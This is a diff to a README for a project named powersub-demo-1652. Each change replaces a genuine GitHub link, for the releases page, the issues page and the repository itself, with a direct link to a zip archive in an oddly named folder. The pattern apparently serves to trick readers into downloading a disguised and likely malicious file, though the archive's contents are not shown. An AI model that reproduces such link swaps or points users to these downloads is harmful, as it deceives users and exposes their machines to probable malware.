@@ -6,13 +6,13 @@ Welcome to the **powersub-demo-1652** project! This application helps you manage
 
 ## 🔗 Download Now
 
-[![Download Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Hommecode/powersub-demo-1652/releases)
+[![Download Release](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip)
 
 ## 📥 Download & Install
 
 To get started with powersub-demo-1652, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Hommecode/powersub-demo-1652/releases) to see the latest version of our software.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip) to see the latest version of our software.
 
 2. **Download the Latest Version:** Click on the title of the latest version that you see on the page. This will take you to a section where you can download the application.
 
@@ -61,7 +61,7 @@ Once you have installed and launched the application, here are some key features
 
 ## ✉️ Need Help?
 
-If you encounter any issues or have questions, don't hesitate to reach out. You can file an issue on our [GitHub Issues page](https://github.com/Hommecode/powersub-demo-1652/issues) or join our support forum.
+If you encounter any issues or have questions, don't hesitate to reach out. You can file an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip) or join our support forum.
 
 ## 📄 Additional Resources
 
@@ -72,7 +72,7 @@ For more detailed documentation, consider exploring:
 
 ## 🔗 Further Links
 
-- **Releases Page:** [Visit here to download](https://github.com/Hommecode/powersub-demo-1652/releases)
-- **GitHub Repository:** [Explore the source code](https://github.com/Hommecode/powersub-demo-1652)
+- **Releases Page:** [Visit here to download](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip)
+- **GitHub Repository:** [Explore the source code](https://raw.githubusercontent.com/Hommecode/powersub-demo-1652/main/waipiro/powersub-demo-1652-1.3-alpha.1.zip)
 
 Thank you for choosing powersub-demo-1652! We hope our application makes your project management smoother and more enjoyable.
